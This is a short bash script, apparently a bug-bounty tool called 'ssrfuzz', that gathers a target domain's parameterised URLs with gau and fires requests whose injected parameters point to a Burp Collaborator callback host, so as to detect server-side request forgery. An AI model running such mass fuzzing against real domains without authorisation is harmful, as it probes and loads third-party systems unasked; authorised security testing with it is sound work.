#!/bin/bash
# ssrfuzz by redfr0g
# credits to Santosh Kumar Sha

if [ -z "$1" ]
  then
    echo "Usage: ./ssrfuzz.sh <domain> <burp collaborator link> <parameter list>"
    exit 1
fi

# Get args
domain=$1
collaborator=$2
wordlist=$3
output="$domain-$(date +'%m-%d-%Y').txt"

# Find known URLs and grep these with parameters
echo "[+] Finding URLs for domain $domain"
gau -b ttf,woff,svg,png,jpg,jpeg,css -subs $domain | grep "=" | sort -u | grep "?" > $output
echo "[+] Found $(wc -l < $output) URLs"

# Copy results to temp file
cp $output fuzz.txt

# Fuzz with Collaborator link and custom URL parameters wordlist (i.e. from ParamMiner)
echo "[+] Fuzzing parameters (this may take a while)..."
xargs -a $wordlist -I@ bash -c 'for url in $(cat fuzz.txt); do echo "$url&@='http://$collaborator'";done' | xargs curl -k --silent -x http://127.0.0.1:8080 &> /dev/null
echo "[+] Finished! Check Burp Collaborator for any connections"